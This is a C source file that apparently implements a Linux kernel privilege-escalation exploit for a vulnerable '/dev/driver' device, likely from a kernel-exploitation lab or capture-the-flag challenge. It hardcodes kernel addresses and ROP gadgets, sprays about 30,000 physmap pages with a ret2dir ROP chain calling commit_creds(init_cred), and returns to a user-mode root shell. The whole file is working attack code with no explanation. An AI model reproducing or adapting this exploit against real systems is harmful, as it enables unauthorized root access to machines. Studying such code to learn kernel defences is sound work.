#define DEMO
#include <demo.h>

u64 init_cred = 0xffffffff82c90320;
u64 commit_creds = 0xffffffff810eed20;
u64 swapgs_restore_regs_and_return_to_usermode = 0xffffffff81e00a4a;

u64 add_rsp_0x70_pop_r12_pop_r13_pop_rbp = 0xffffffff81e00a4a;
u64 pop_rsp_ret = 0xffffffff81219e24;
u64 pop_rdi_ret = 0xffffffff81039dbd;
u64 leave_ret = 0xffffffff81002094;
u64 ret = 0xffffffff810001dc;

int fd;
u64 page_size;
u64 try_hit = 0xffff888000000000 + 0x3000000;

u64 *physmap_spray_arr[30000];

u64 payload[6] = {
    0xffff888000000000 + 0x3000000,
    0xffff888000000000 + 0x3000000,
    0xffff888000000000 + 0x3000000,
    0xffffffff81002094};

void ret2dir(u64 *page)
{
    int i = 0;
    for (; i < 0x10; i++)
    {
        page[i] = 0xffffffff810001dc;
    }

    page[i++] = pop_rdi_ret;
    page[i++] = init_cred;
    page[i++] = commit_creds;
    page[i++] = swapgs_restore_regs_and_return_to_usermode;
    page[i++] = 0;
    page[i++] = 0;
    page[i++] = &kernel_shell;
    page[i++] = user_cs;
    page[i++] = user_rflags;
    page[i++] = user_sp;
    page[i++] = user_ss;
}

int main()
{
    kernel_save_status();
    fd = open("/dev/driver", O_RDWR);
    if (fd < 0)
    {
        printf("open kgadget failed\n");
        return -1;
    }

    page_size = sysconf(_SC_PAGESIZE);
    physmap_spray_arr[0] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    ret2dir(physmap_spray_arr[0]);
    for (int i = 1; i < 30000; i++)
    {
        physmap_spray_arr[i] = mmap(NULL, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (physmap_spray_arr[i] == MAP_FAILED)
        {
            printf("mmap failed\n");
            exit(0);
        }
        memcpy(physmap_spray_arr[i], physmap_spray_arr[0], page_size);
    }
    printf("mmap success\n");
    // asm volatile(
    //     "mov r9,    physmap_spray_arr[0];"
    //     "mov r8,    physmap_spray_arr[0];"
    //     "mov rax,   0;"
    //     "mov rcx,   physmap_spray_arr[0];"
    //     "mov rdx,   0x30;"
    //     "mov rsi,   payload;"
    //     "mov rdi,   fd;"
    //     "syscall");
    read(fd, payload, 0x30);
    return 0;
}